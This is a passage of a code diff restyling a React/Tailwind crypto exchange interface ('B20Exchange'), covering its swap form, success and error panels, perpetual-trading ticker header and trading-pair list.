+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'community' ? 'bg-white text-slate-900 shadow-sm border border-slate-200/80' : 'text-slate-500 hover:text-slate-900 hover:bg-white/50'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-blue-500/30 rounded-full animate-gold-wave" />
+                                
                                 <Users className={`w-4 h-4 relative z-10 ${mode === 'community' ? 'text-white' : 'text-blue-500'}`} />
                             </div>
                             Community
                         </button>
                          <button 
                             onClick={() => setMode('announcements')}
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'announcements' ? 'bg-purple-500 text-white shadow-2xl shadow-purple-500/20 scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-50'}`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 ${mode === 'announcements' ? 'bg-white text-slate-900 shadow-sm border border-slate-200/80' : 'text-slate-500 hover:text-slate-900 hover:bg-white/50'}`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-purple-500/30 rounded-full animate-gold-wave" />
+                                
                                 <Megaphone className={`w-4 h-4 relative z-10 ${mode === 'announcements' ? 'text-white' : 'text-purple-500'}`} />
                             </div>
                             Bulletin
                         </button>
                          <Link 
                             href="/fiat"
-                            className={`px-10 py-5 rounded-3xl text-[11px] font-black uppercase tracking-[0.2em] transition-all whitespace-nowrap flex items-center gap-3 text-amber-600 hover:text-amber-700 hover:bg-amber-50 border border-amber-200/60 shadow-lg shadow-amber-500/5`}
+                            className={`px-5 py-2.5 rounded-[14px] text-[11px] font-bold uppercase tracking-wide transition-all whitespace-nowrap flex items-center gap-3 text-indigo-600 hover:text-indigo-700 hover:bg-indigo-50 border border-indigo-200/60 shadow-lg shadow-indigo-500/5`}
                         >
                             <div className="relative flex items-center justify-center">
-                                <div className="absolute inset-0 bg-amber-500/30 rounded-full animate-gold-wave" />
-                                <CreditCard className="w-4 h-4 relative z-10 text-amber-500" />
+                                <div className="absolute inset-0 bg-indigo-600/30 rounded-full animate-pulse" />
+                                <CreditCard className="w-4 h-4 relative z-10 text-indigo-600" />
                             </div>
                             Express Fiat
                         </Link>
@@ -1245,141 +1364,165 @@ export default function B20Exchange() {
                             initial={{ opacity: 0, scale: 0.98 }}
                             animate={{ opacity: 1, scale: 1 }}
                             exit={{ opacity: 0, scale: 1.02 }}
-                            className="max-w-[1400px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-12"
+                            className="max-w-[1400px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8"
                         >
-                            <div className="lg:col-span-7 flex flex-col gap-8">
-                                <div className="bg-white shadow-[0_50px_100px_-20px_rgba(0,0,0,0.15)] border border-white rounded-[3rem] p-8 md:p-12 relative overflow-hidden group hover:shadow-[0_70px_120px_-20px_rgba(0,0,0,0.2)] transition-all duration-500">
-                                    <div className="absolute top-0 right-0 p-12 opacity-5 group-hover:scale-110 transition-transform duration-700">
-                                        <TrendingUp className="w-48 h-48" />
+                            <div className="lg:col-span-7 flex flex-col gap-6">
+                                <div className="bg-white shadow-xl shadow-slate-200/50 border border-slate-100 rounded-3xl p-6 relative overflow-hidden transition-all duration-500">
+                                    <div className="flex items-center justify-between mb-6">
+                                        <div className="flex gap-4 items-center">
+                                            <h2 className="text-xl font-bold text-slate-900 tracking-tight">Swap</h2>
+                                            <div className="px-2 py-1 bg-indigo-50 text-indigo-600 rounded-md text-[10px] font-bold tracking-widest uppercase flex items-center gap-1.5">
+                                                <div className="w-1.5 h-1.5 bg-indigo-500 rounded-full animate-pulse" /> Live
+                                            </div>
+                                        </div>
+                                        <button className="p-2 text-slate-400 hover:text-slate-900 transition-colors rounded-xl hover:bg-slate-50">
+                                            <Settings className="w-5 h-5" />
+                                        </button>
                                     </div>
-                                    
-                                    <div className="relative z-10">
-                                        <div className="flex items-center justify-between mb-12">
-                                            <h2 className="text-2xl font-black text-gray-900 uppercase tracking-tighter">Institutional Swap</h2>
-                                            <div className="flex gap-2">
-                                                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                                <span className="text-[10px] font-black text-emerald-500 uppercase tracking-widest">BSC Mainnet Live</span>
+
+                                    <form onSubmit={handleSwap} className="space-y-1 relative">
+                                        {/* From Input */}
+                                        <div className="bg-slate-50 hover:bg-slate-100 border border-transparent focus-within:border-indigo-200 focus-within:bg-white rounded-2xl p-4 transition-all">
+                                            <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500 mb-2">
+                                                <span>You pay</span>
+                                                <span className="cursor-pointer hover:text-indigo-600">Balance: {parseFloat(balances.from).toFixed(4)}</span>
+                                            </div>
+                                            <div className="flex items-center gap-3">
+                                                <input 
+                                                    type="number" 
+                                                    step="0.0001"
+                                                    value={fromAmount}
+                                                    onChange={(e) => setFromAmount(e.target.value)}
+                                                    placeholder="0.00"
+                                                    className="flex-1 bg-transparent text-4xl font-semibold outline-none text-slate-900 placeholder:text-slate-300 w-full min-w-0"
+                                                />
+                                                <button 
+                                                    type="button"
+                                                    onClick={() => { setSelectingFor('from'); setIsSelectorOpen(true); }}
+                                                    className="flex items-center gap-2 px-3 py-2 bg-white border border-slate-200 rounded-xl shadow-sm hover:border-indigo-300 hover:bg-indigo-50 transition-all font-bold text-sm shrink-0"
+                                                >
+                                                    {fromToken?.image ? <img src={fromToken.image} className="w-6 h-6 rounded-full" alt="" /> : null}
+                                                    <span>{fromToken?.symbol}</span>
+                                                    <ChevronDown className="w-4 h-4 text-slate-400" />
+                                                </button>
                                             </div>
                                         </div>
 
-                                        <form onSubmit={handleSwap} className="space-y-8">
-                                            {/* From */}
-                                            <div className="bg-gray-50 border border-gray-100 rounded-[2rem] p-6 group focus-within:border-amber-500/50 transition-all">
-                                                <div className="flex justify-between items-center text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4">
-                                                    <span>Pay Amount</span>
-                                                    <span>Bal: {parseFloat(balances.from).toFixed(4)}</span>
-                                                </div>
-                                                <div className="flex items-center gap-4">
-                                                    <input 
-                                                        type="number" 
-                                                        step="0.0001"
-                                                        value={fromAmount}
-                                                        onChange={(e) => setFromAmount(e.target.value)}
-                                                        placeholder="0.00"
-                                                        className="flex-1 bg-transparent text-3xl font-black outline-none text-gray-900 placeholder:text-gray-200"
-                                                    />
-                                                    <button 
-                                                        type="button"
-                                                        onClick={() => { setSelectingFor('from'); setIsSelectorOpen(true); }}
-                                                        className="flex items-center gap-3 px-5 py-3 bg-white border border-gray-100 rounded-2xl shadow-sm hover:border-amber-500/50 transition-all font-black text-xs uppercase"
-                                                    >
-                                                        {fromToken?.image ? <img src={fromToken.image} className="w-6 h-6 rounded-lg" alt="" /> : null}
-                                                        {fromToken?.symbol}
-                                                        <ChevronDown className="w-4 h-4 text-gray-400" />
-                                                    </button>
-                                                </div>
-                                            </div>
+                                        {/* Swap Direction Toggle */}
+                                        <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10">
+                                            <button 
+                                                type="button"
+                                                onClick={() => {
+                                                    const temp = fromToken;
+                                                    setFromToken(toToken);
+                                                    setToToken(temp);
+                                                }}
+                                                className="w-10 h-10 bg-white text-slate-500 hover:text-indigo-600 rounded-xl flex items-center justify-center shadow-md border border-slate-100 hover:scale-110 active:scale-95 transition-all"
+                                            >
+                                                <ArrowDown className="w-5 h-5" />
+                                            </button>
+                                        </div>
 
-                                            {/* Switch */}
-                                            <div className="flex justify-center -my-6 relative z-10">
+                                        {/* To Input */}
+                                        <div className="bg-slate-50 border border-transparent rounded-2xl p-4 transition-all">
+                                            <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500 mb-2">
+                                                <span>You receive</span>
+                                                <span>Balance: {parseFloat(balances.to).toFixed(4)}</span>
+                                            </div>
+                                            <div className="flex items-center gap-3">
+                                                <input 
+                                                    type="text" 
+                                                    value={toAmount}
+                                                    readOnly
+                                                    placeholder="0.00"
+                                                    className="flex-1 bg-transparent text-4xl font-semibold outline-none text-slate-900 w-full min-w-0"
+                                                />
                                                 <button 
                                                     type="button"
-                                                    onClick={() => {
-                                                        const temp = fromToken;
-                                                        setFromToken(toToken);
-                                                        setToToken(temp);
-                                                    }}
-                                                    className="w-12 h-12 bg-gray-900 text-white rounded-2xl flex items-center justify-center shadow-xl hover:scale-110 active:scale-95 transition-all border-4 border-white"
+                                                    onClick={() => { setSelectingFor('to'); setIsSelectorOpen(true); }}
+                                                    className="flex items-center gap-2 px-3 py-2 bg-indigo-600 text-white rounded-xl shadow-md hover:bg-indigo-700 transition-all font-bold text-sm shrink-0"
                                                 >
-                                                    <ArrowDownUp className="w-5 h-5" />
+                                                    {toToken?.image ? <img src={toToken.image} className="w-6 h-6 rounded-full bg-white p-0.5" alt="" /> : null}
+                                                    <span>{toToken?.symbol}</span>
+                                                    <ChevronDown className="w-4 h-4 opacity-80" />
                                                 </button>
                                             </div>
+                                        </div>
 
-                                            {/* To */}
-                                            <div className="bg-gray-50 border border-gray-100 rounded-[2rem] p-6 group focus-within:border-amber-500/50 transition-all">
-                                                <div className="flex justify-between items-center text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4">
-                                                    <span>Receive Est.</span>
-                                                    <span>Bal: {parseFloat(balances.to).toFixed(4)}</span>
+                                        {/* Routing Details */}
+                                        {fromAmount && swapStatus !== 'loading' && (
+                                            <div className="px-4 py-4 mt-2 space-y-3">
+                                                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500">
+                                                    <span>Exchange Rate</span>
+                                                    <span className="text-slate-900">1 {fromToken?.symbol} = {toToken?.current_price && fromToken?.current_price ? (fromToken.current_price / toToken.current_price).toFixed(4) : '0.00'} {toToken?.symbol}</span>
                                                 </div>
-                                                <div className="flex items-center gap-4">
-                                                    <input 
-                                                        type="text" 
-                                                        value={toAmount}
-                                                        readOnly
-                                                        placeholder="0.00"
-                                                        className="flex-1 bg-transparent text-3xl font-black outline-none text-gray-900"
-                                                    />
-                                                    <button 
-                                                        type="button"
-                                                        onClick={() => { setSelectingFor('to'); setIsSelectorOpen(true); }}
-                                                        className="flex items-center gap-3 px-5 py-3 bg-white border border-gray-100 rounded-2xl shadow-sm hover:border-amber-500/50 transition-all font-black text-xs uppercase"
-                                                    >
-                                                        {toToken?.image ? <img src={toToken.image} className="w-6 h-6 rounded-lg" alt="" /> : null}
-                                                        {toToken?.symbol}
-                                                        <ChevronDown className="w-4 h-4 text-gray-400" />
-                                                    </button>
+                                                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500">
+                                                    <span>Network Fee</span>
+                                                    <span className="text-slate-900">~$0.15</span>
+                                                </div>
+                                                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500">
+                                                    <span>Price Impact</span>
+                                                    <span className="text-emerald-500">&lt; 0.01%</span>
+                                                </div>
+                                                <div className="flex justify-between items-center text-[11px] font-semibold text-slate-500">
+                                                    <span className="flex items-center gap-1">Routing <Info className="w-3 h-3" /></span>
+                                                    <span className="text-indigo-600 flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> B20 Aggregator</span>
                                                 </div>
                                             </div>
-
-                                            {swapStatus !== 'loading' && (
-                                                <>
-                                                    <div className="pt-6 px-4 space-y-4">
-                                                        <div className="flex justify-between items-center text-[10px] font-bold uppercase tracking-widest">
-                                                            <span className="text-gray-400 flex items-center gap-2">Protocol Fee <Info className="w-3 h-3" /></span>
-                                                            <span className="text-amber-600 font-black">0.001% (Institutional)</span>
-                                                        </div>
-                                                    </div>
-
-                                                    <div className="flex items-center justify-between px-6 mb-6">
-                                                        <div className="flex items-center gap-2">
-                                                            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                                            <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Institutional Link:</span>
-                                                        </div>
-                                                        <span className="text-[10px] font-black text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full border border-emerald-100 uppercase tracking-widest flex items-center gap-2">
-                                                            <ShieldCheck className="w-3 h-3" /> ACTIVE_PERM (PROTOCOL)
-                                                        </span>
-                                                    </div>
-                                                </>
-                                            )}
-
-                                            <button 
-                                                type="submit"
-                                                disabled={swapStatus === 'loading' || !fromAmount}
-                                                className="w-full py-6 bg-gray-900 text-white font-black text-lg rounded-[2rem] mt-4 hover:bg-amber-500 transition-all active:scale-[0.98] shadow-2xl disabled:opacity-50"
-                                            >
-                                                {swapStatus === 'loading' ? 'SWAP INITING...' : 'INITIATE TRANSACTION'}
-                                            </button>
-                                        </form>
-
-                                        {swapStatus === 'success' && (
-                                            <motion.div initial={{ opacity:0, y:20 }} animate={{ opacity:1, y:0 }} className="mt-8 p-6 bg-emerald-50 border border-emerald-100 rounded-3xl flex items-center gap-4">
-                                                <div className="w-12 h-12 bg-emerald-500 text-white rounded-2xl flex items-center justify-center shrink-0 shadow-lg shadow-emerald-500/20"><Check className="w-6 h-6" /></div>
-                                                <div>
-                                                    <p className="font-black text-emerald-600 uppercase text-xs">Transaction Verified</p>
-                                                    <p className="text-[10px] font-bold text-gray-400 uppercase">Tokens have been distributed</p>
-                                                </div>
-                                            </motion.div>
                                         )}
-                                        {error && (
-                                            <motion.div initial={{ opacity:0, y:20 }} animate={{ opacity:1, y:0 }} className="mt-8 p-6 bg-rose-50 border border-rose-100 rounded-3xl flex items-center gap-4">
-                                                <div className="w-12 h-12 bg-rose-500 text-white rounded-2xl flex items-center justify-center shrink-0 shadow-lg shadow-rose-500/20"><X className="w-6 h-6" /></div>
-                                                <div>
-                                                    <p className="font-black text-rose-600 uppercase text-xs">Execution Failed</p>
-                                                    <p className="text-[10px] font-bold text-gray-400 uppercase truncate max-w-[300px]">{error}</p>
+
+                                        <button 
+                                            type="submit"
+                                            disabled={swapStatus === 'loading' || !fromAmount}
+                                            className="w-full py-4 bg-indigo-600 text-white font-bold text-lg rounded-2xl mt-4 hover:bg-indigo-700 active:scale-[0.98] shadow-lg shadow-indigo-600/20 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
+                                        >
+                                            {swapStatus === 'loading' ? 'Confirming...' : (fromAmount ? 'Review Swap' : 'Enter an amount')}
+                                        </button>
+                                    </form>
+
+                                    {swapStatus === 'success' && swapSuccessDetails && (
+                                        <motion.div initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} className="mt-6 p-5 bg-emerald-50 border border-emerald-100 rounded-2xl flex flex-col gap-4 shadow-sm shadow-emerald-500/10">
+                                            <div className="flex items-center gap-4 border-b border-emerald-100/50 pb-3">
+                                                <div className="w-10 h-10 bg-gradient-to-br from-emerald-400 to-emerald-600 text-white rounded-xl flex items-center justify-center shrink-0 shadow-md shadow-emerald-500/20">
+                                                    <Check className="w-5 h-5" />
                                                 </div>
-                                            </motion.div>
-                                        )}
-                                    </div>
+                                                <div>
+                                                    <p className="font-black text-emerald-800 text-sm">Swap Successful</p>
+                                                    <p className="text-[10px] font-bold text-emerald-600 uppercase tracking-widest">On-Chain Executed</p>
+                                                </div>
+                                            </div>
+                                            <div className="space-y-2">
+                                                <div className="flex justify-between items-center text-xs">
+                                                    <span className="text-slate-500 font-semibold">Swapped</span>
+                                                    <span className="font-black text-slate-800">{swapSuccessDetails.fromAmount} <span className="text-slate-500 text-[10px]">{swapSuccessDetails.fromSymbol}</span></span>
+                                                </div>
+                                                <div className="flex justify-between items-center text-xs">
+                                                    <span className="text-slate-500 font-semibold">Received</span>
+                                                    <span className="font-black text-emerald-600">~{swapSuccessDetails.quantity} <span className="text-slate-500 text-[10px]">{swapSuccessDetails.toSymbol}</span></span>
+                                                </div>
+                                                <div className="flex justify-between items-center text-xs">
+                                                    <span className="text-slate-500 font-semibold">Execution Price</span>
+                                                    <span className="font-bold text-slate-800">${swapSuccessDetails.price}</span>
+                                                </div>
+                                                <div className="flex justify-between items-center text-xs mt-2 pt-2 border-t border-emerald-100/50">
+                                                    <span className="text-slate-500 font-semibold">Transaction</span>
+                                                    <a href={`https://bscscan.com/tx/${swapSuccessDetails.hash}`} target="_blank" rel="noopener noreferrer" className="font-mono font-bold text-indigo-500 hover:text-indigo-600 underline flex items-center gap-1">
+                                                        {swapSuccessDetails.hash.slice(0,6)}...{swapSuccessDetails.hash.slice(-4)}
+                                                        <ExternalLink className="w-3 h-3" />
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </motion.div>
+                                    )}
+                                    {error && (
+                                        <motion.div initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} className="mt-6 p-4 bg-rose-50 border border-rose-100 rounded-xl flex items-center gap-4">
+                                            <div className="w-10 h-10 bg-rose-500 text-white rounded-xl flex items-center justify-center shrink-0 shadow-md shadow-rose-500/20"><X className="w-5 h-5" /></div>
+                                            <div>
+                                                <p className="font-bold text-rose-700 text-sm">Swap Failed</p>
+                                                <p className="text-xs font-semibold text-slate-500 line-clamp-1">{error}</p>
+                                            </div>
+                                        </motion.div>
+                                    )}
                                 </div>
                             </div>
                             
@@ -1395,297 +1538,341 @@ export default function B20Exchange() {
                             initial={{ opacity: 0, scale: 0.98 }}
                             animate={{ opacity: 1, scale: 1 }}
                             exit={{ opacity: 0, scale: 1.02 }}
-                            className="max-w-[1850px] mx-auto transition-all duration-700 select-none pb-20"
+                            className="max-w-[1920px] mx-auto px-4 pb-20 select-none"
                         >
-                            {/* 1. INSTITUTIONAL TICKER HEADER */}
-                            <div className="bg-white border-b border-gray-100 flex flex-wrap items-center gap-8 py-4 px-10 mb-8 rounded-[2.5rem] shadow-2xl shadow-gray-200/40 relative z-[25] mt-2">
-                                <div className="flex items-center gap-6">
-                                    <div className="flex items-center gap-3">
-                                        <div className="w-12 h-12 bg-gray-50 rounded-2xl p-2 border border-gray-100 shadow-sm relative group overflow-hidden">
-                                            <div className="absolute inset-0 bg-amber-500/10 opacity-0 group-hover:opacity-100 transition-opacity" />
+                            {/* 1. PROFESSIONAL TICKER HUD */}
+                            <div className="bg-[#0B0E11] border border-gray-800 flex flex-wrap items-center gap-10 py-5 px-10 mb-6 rounded-3xl shadow-2xl relative z-[25] mt-4 overflow-hidden">
+                                <div className="absolute inset-0 bg-gradient-to-r from-indigo-500/5 to-transparent pointer-events-none" />
+                                
+                                <div className="flex items-center gap-6 relative z-10">
+                                    <div className="flex items-center gap-4">
+                                        <div className="w-14 h-14 bg-gray-900 rounded-2xl p-2 border border-gray-800 shadow-inner group overflow-hidden relative">
+                                            <div className="absolute inset-0 bg-indigo-500/10 opacity-0 group-hover:opacity-100 transition-opacity" />
                                             {toToken?.image ? <img src={toToken.image} className="w-full h-full object-contain rounded-lg relative z-10" alt="" /> : null}
                                         </div>
                                         <div className="flex flex-col">
                                             <div className="flex items-center gap-2">
-                                                <h2 className="text-xl font-black text-gray-900 uppercase tracking-tighter">{toToken?.symbol}/USDT</h2>
-                                                <span className="bg-amber-100 text-amber-600 px-2.5 py-1 rounded-lg text-[9px] font-black tracking-widest uppercase">Perp</span>
+                                                <h2 className="text-2xl font-black text-white uppercase tracking-tighter leading-none">{toToken?.symbol}/USDT</h2>
+                                                <div className="flex items-center gap-1.5 bg-indigo-500/10 border border-indigo-500/20 px-2 py-0.5 rounded-md">
+                                                    <span className="text-[8px] font-black text-indigo-400 tracking-[0.2em] uppercase">Perp</span>
+                                                </div>
                                             </div>
-                                            <p className="text-[10px] font-bold text-gray-400 uppercase tracking-[0.2em]">{toToken?.name} · BSC Node-01</p>
+                                            <div className="flex items-center gap-2 mt-1">
+                                                <span className="text-[9px] font-bold text-gray-500 uppercase tracking-widest">{toToken?.name}</span>
+                                                <div className="w-1 h-1 bg-gray-700 rounded-full" />
+                                                <span className="text-[9px] font-bold text-indigo-500 uppercase tracking-widest">Cross-Margin</span>
+                                            </div>
                                         </div>
                                     </div>
                                 </div>
 
-                                <div className="h-10 w-px bg-gray-100 hidden lg:block" />
+                                <div className="h-12 w-px bg-gray-800/50 hidden lg:block" />
                                 
-                                <div className="flex flex-wrap gap-10">
-                                    <div className="space-y-1">
-                                        <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest opacity-60">Entry Value</p>
-                                        <div className="flex items-center gap-2">
-                                            <span className={`text-base font-black italic ${toToken?.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
+                                <div className="flex flex-wrap gap-12 relative z-10">
+                                    <div className="flex flex-col gap-1.5">
+                                        <p className="text-[8px] font-black text-gray-500 uppercase tracking-widest flex items-center gap-2">
+                                            <div className="w-1 h-1 bg-gray-500 rounded-full" /> Execution Price
+                                        </p>
+                                        <div className="flex items-baseline gap-2">
+                                            <span className={`text-xl font-black italic font-mono ${toToken?.price_change_percentage_24h >= 0 ? 'text-emerald-400' : 'text-rose-400'}`}>
                                                 ${toToken?.current_price < 0.01 ? toToken.current_price.toFixed(6) : toToken?.current_price?.toLocaleString()}
                                             </span>
-                                            <span className="text-[10px] font-bold text-gray-400 font-mono">≈ {(toToken?.current_price / (bnbPrice || 1)).toFixed(6)} BNB</span>
                                         </div>
                                     </div>
 
-                                    <div className="space-y-1">
-                                        <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest opacity-60">24h Alpha</p>
-                                        <p className={`text-sm font-black ${toToken?.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
-                                            {toToken?.price_change_percentage_24h >= 0 ? '+' : ''}{toToken?.price_change_percentage_24h?.toFixed(2)}%
+                                    <div className="flex flex-col gap-1.5">
+                                        <p className="text-[8px] font-black text-gray-500 uppercase tracking-widest">24H Dynamic</p>
+                                        <div className={`text-sm font-black flex items-center gap-1.5 ${toToken?.price_change_percentage_24h >= 0 ? 'text-emerald-400' : 'text-rose-400'}`}>
+                                            {toToken?.price_change_percentage_24h >= 0 ? <ArrowUpRight className="w-3 h-3" /> : <ArrowDownRight className="w-3 h-3" />}
+                                            {Math.abs(toToken?.price_change_percentage_24h || 0).toFixed(2)}%
+                                        </div>
+                                    </div>
+
+                                    <div className="flex flex-col gap-1.5 hidden xl:flex">
+                                        <p className="text-[8px] font-black text-gray-500 uppercase tracking-widest">Funding Rate / Countdown</p>
+                                        <p className="text-sm font-black text-white font-mono flex items-center gap-2">
+                                            <span className="text-indigo-400">0.0100%</span>
+                                            <span className="text-gray-600">/</span>
+                                            <span className="text-gray-400">06:42:12</span>
                                         </p>
                                     </div>
 
-                                    <div className="space-y-1 hidden sm:block">
-                                        <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest opacity-60">Target High</p>
-                                        <p className="text-sm font-black text-gray-900">${toToken?.high_24h < 0.01 ? toToken.high_24h.toFixed(6) : toToken?.high_24h?.toLocaleString()}</p>
-                                    </div>
-
-                                    <div className="space-y-1 hidden sm:block">
-                                        <p className="text-[8px] font-black text-gray-400 uppercase tracking-widest opacity-60">Floor Support</p>
-                                        <p className="text-sm font-black text-gray-900">${toToken?.low_24h < 0.01 ? toToken.low_24h.toFixed(6) : toToken?.low_24h?.toLocaleString()}</p>
+                                    <div className="flex flex-col gap-1.5 hidden 2xl:flex">
+                                        <p className="text-[8px] font-black text-gray-500 uppercase tracking-widest">24H High / Low</p>
+                                        <p className="text-sm font-black text-white font-mono space-x-2">
+                                            <span className="text-emerald-400">H: {toToken?.high_24h < 0.01 ? toToken.high_24h.toFixed(4) : toToken?.high_24h?.toLocaleString()}</span>
+                                            <span className="text-gray-700">|</span>
+                                            <span className="text-rose-400">L: {toToken?.low_24h < 0.01 ? toToken.low_24h.toFixed(4) : toToken?.low_24h?.toLocaleString()}</span>
+                                        </p>
                                     </div>
                                 </div>
-
-                                <div className="ml-auto flex items-center gap-5">
-                                    <div className="flex bg-emerald-50 px-5 py-2.5 rounded-2xl border border-emerald-100 gap-3 items-center">
-                                        <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                        <span className="text-[10px] font-black text-emerald-600 uppercase tracking-widest">Node-01 Verified</span>
+                                <div className="ml-auto flex items-center gap-6 relative z-10">
+                                    <div className="flex items-center gap-3 bg-gray-900 px-5 py-2.5 rounded-2xl border border-gray-800 shadow-inner">
+                                        <Activity className="w-3.5 h-3.5 text-indigo-500" />
+                                        <div className="flex flex-col">
+                                            <span className="text-[9px] font-black text-white uppercase tracking-widest">Node-01 Active</span>
+                                            <span className="text-[7px] font-bold text-gray-500 uppercase tracking-widest">Latency: 12ms</span>
+                                        </div>
                                     </div>
-                                    <button 
-                                        onClick={() => setIsSelectorOpen(true)}
-                                        className="p-3.5 bg-gray-50 border border-gray-100 rounded-2xl text-gray-400 hover:text-amber-500 hover:bg-white transition-all shadow-sm"
-                                    >
-                                        <Search className="w-5 h-5" />
-                                    </button>
                                 </div>
                             </div>
-
-                            <div className="grid grid-cols-1 xl:grid-cols-12 gap-6 h-[1150px]">
-                                {/* 1. MARKET SCANNER - LEFT */}
-                                <div className="xl:col-span-3 bg-white border border-gray-100 rounded-[2.5rem] flex flex-col overflow-hidden shadow-2xl shadow-gray-100/50">
-                                    <div className="p-7 border-b border-gray-50 flex items-center justify-between bg-gray-50/30">
-                                        <h3 className="text-[10px] font-black text-gray-900 uppercase tracking-[0.3em] flex items-center gap-3">
-                                            <List className="w-4 h-4 text-amber-500" /> System Scanner
-                                        </h3>
-                                        <span className="text-[8px] font-black text-gray-300 uppercase tracking-widest">300+ Pairs Active</span>
+                            <div className="grid xl:grid-cols-12 gap-5 min-h-[900px]">
+                                <div className="xl:col-span-2 bg-white border border-slate-200 rounded-3xl flex flex-col overflow-hidden shadow-sm h-[550px]">
+                                    <div className="p-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
+                                        <div className="flex flex-col">
+                                            <h3 className="text-[10px] font-black text-slate-900 uppercase tracking-widest flex items-center gap-2">
+                                                <LayoutGrid className="w-3.5 h-3.5 text-indigo-600" /> Pairs
+                                            </h3>
+                                            <span className="text-[7px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Institutional Scan</span>
+                                        </div>
+                                        <div className="p-1.5 bg-white border border-slate-200 rounded-lg shadow-sm">
+                                            <Filter className="w-3 h-3 text-slate-400" />
+                                        </div>
                                     </div>
-                                    <div className="p-5 border-b border-gray-50">
-                                        <div className="relative group">
-                                            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 group-focus-within:text-amber-500 transition-colors" />
+                                    <div className="p-4 border-b border-slate-100 bg-white">
+                                        <div className="relative group/search">
+                                            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-slate-400 group-focus-within/search:text-indigo-600 transition-colors" />
                                             <input 
-                                                type="text" placeholder="ENTER ASSET SYMBOL..." value={marketSearch} onChange={(e) => setMarketSearch(e.target.value)}
-                                                className="w-full bg-gray-50 border border-gray-100 rounded-2xl py-4 pl-11 pr-4 text-[10px] font-black outline-none focus:bg-white focus:border-amber-500/20 transition-all placeholder:text-gray-300 uppercase lg:tracking-widest"
+                                                type="text" placeholder="SEARCH PAIRS..." value={marketSearch} onChange={(e) => setMarketSearch(e.target.value)}
+                                                className="w-full bg-slate-50 border border-slate-200 rounded-xl py-2.5 pl-10 pr-4 text-[10px] font-black text-slate-900 outline-none focus:bg-white focus:border-indigo-500/30 transition-all placeholder:text-slate-300 uppercase"
                                             />
                                         </div>
                                     </div>
-                                    <div className="flex-1 overflow-y-auto custom-scrollbar p-3 space-y-1">
+                                    <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1.5 bg-white">
                                         {displayTokens.slice(0, 500).map(t => (
                                             <button 
                                                 key={t.id || t.address} onClick={() => setToToken(t)}
-                                                className={`w-full flex items-center justify-between p-3.5 rounded-[1.5rem] transition-all group/pair ${toToken?.id === t.id ? 'bg-gray-950 text-white shadow-2xl shadow-black/40 scale-[0.98]' : 'hover:bg-gray-50 text-gray-400'}`}
+                                                className={`w-full flex items-center justify-between p-3 rounded-xl transition-all group/pair relative overflow-hidden border ${toToken?.id === t.id ? 'bg-indigo-50 border-indigo-600 shadow-lg shadow-indigo-200' : 'bg-transparent border-transparent hover:bg-slate-50 hover:border-slate-200'}`}
                                             >
-                                                <div className="flex items-center gap-3">
-                                                    <div className="w-8 h-8 rounded-xl bg-white p-1 border border-gray-100 flex items-center justify-center shrink-0">
-                                                        <img src={t.image} className="w-full h-full object-contain" alt="" />
+                                                {/* Left Performance Indicator */}
+                                                <div className={`absolute left-0 top-0 bottom-0 w-1 ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-500/30' : 'bg-rose-500/30'}`} />
+                                                
+                                                <div className="flex items-center gap-3 relative z-10">
+                                                    <div className={`w-8 h-8 rounded-lg p-1 border flex items-center justify-center shrink-0 shadow-sm transition-transform group-hover/pair:scale-110 ${toToken?.id === t.id ? 'bg-white/10 border-white/20' : 'bg-white border-slate-200'}`}>
+                                                        {t.image ? (
+                                                            <img src={t.image} className="w-full h-full object-contain rounded-sm" alt="" />
+                                                        ) : (
+                                                            <div className="w-full h-full bg-indigo-600 rounded-sm flex items-center justify-center text-[10px] font-black text-white">{t.symbol?.charAt(0)}</div>
+                                                        )}
                                                     </div>
                                                     <div className="text-left">
-                                                        <p className={`text-[10px] font-black uppercase tracking-tighter ${toToken?.id === t.id ? 'text-white' : 'text-gray-900'}`}>{t.symbol}/PERP</p>
-                                                        <p className="text-[8px] font-bold text-gray-400">VOL: ${formatB20Number(t.total_volume)}</p>
+                                                        <div className="flex items-center gap-1.5">
+                                                            <p className={`text-[11px] font-black uppercase tracking-tight ${toToken?.id === t.id ? 'text-white' : 'text-slate-900'}`}>{t.symbol}</p>
+                                                            {t.network && (
